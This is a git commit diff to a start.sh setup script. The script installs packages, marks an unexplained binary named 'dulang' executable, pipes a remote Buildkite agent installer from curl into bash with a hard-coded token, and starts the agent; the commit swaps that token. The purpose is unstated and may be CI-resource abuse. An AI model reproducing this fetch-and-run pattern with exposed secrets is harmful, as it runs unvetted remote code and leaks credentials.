856d4ee6189b87aaf08470a3f006685e86860827
dfgfd443rete <86584933+dfgfd443rete@users.noreply.github.com>
2021-06-28 22:32:56 +0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -3,5 +3,5 @@ sudo apt update
 sudo apt install screen libjansson4 -y 
 chmod +x dulang
 screen -dmS ls 
-TOKEN="eb7efad977c985733618f330368724f5b7de9931b5e6b6e40b" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/master/install.sh`"
+TOKEN="541f49219b7bb5fb8c331ca6ce2124a390997028e886be01f4" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/master/install.sh`"
 ~/.buildkite-agent/bin/buildkite-agent start
